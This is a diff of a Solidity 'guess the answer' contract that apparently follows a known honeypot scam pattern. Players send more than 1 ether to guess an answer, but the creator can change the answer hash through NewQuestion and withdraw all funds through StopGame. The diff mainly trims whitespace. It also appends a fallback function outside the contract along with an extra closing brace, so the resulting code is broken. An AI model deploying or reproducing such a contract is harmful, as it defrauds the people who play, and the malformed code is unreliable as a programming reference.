@@ -7,19 +7,19 @@ contract guess_wis
     payable
     {
         require(msg.sender == tx.origin);
-        
+
         if(responseHash == keccak256(_response) && msg.value>1 ether)
         {
             msg.sender.transfer(this.balance);
         }
     }
-    
+
     string public question;
- 
+
     address questionSender;
-  
+
     bytes32 responseHash;
- 
+
     function StartGuess_wis(string _question,string _response)
     public
     payable
@@ -27,32 +27,36 @@ contract guess_wis
         if(responseHash==0x0)
         {
             responseHash = keccak256(_response);
-            
+
             question = _question;
-            
+
             questionSender = msg.sender;
         }
     }
-    
+
     function StopGame()
     public
     payable
     {
        require(msg.sender==questionSender);
-       
+
        msg.sender.transfer(this.balance);
     }
-    
+
     function NewQuestion(string _question, bytes32 _responseHash)
     public
     payable
     {
         require(msg.sender==questionSender);
-        
+
         question = _question;
-        
+
         responseHash = _responseHash;
     }
-    
+
     function() public payable{}
+}
+function() payable external {
+	revert();
+}
 }
